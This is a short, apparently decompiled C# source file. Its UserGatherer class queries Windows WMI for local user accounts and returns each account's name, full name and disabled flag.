using NoiseMe.Drags.App.Models.WMI.Objects;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Data.WMI
{
	public static class UserGatherer
	{
		public static ICollection<UserAccount> GetUsers()
		{
			List<UserAccount> list = new List<UserAccount>();
			string[] properties = new string[3]
			{
				"Name",
				"FullName",
				"Disabled"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_UserAccount", properties);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				UserAccount item = new UserAccount((string)item2["Name"].Value, (string)item2["FullName"].Value, (bool?)item2["Disabled"].Value);
				list.Add(item);
			}
			return list;
		}
	}
}
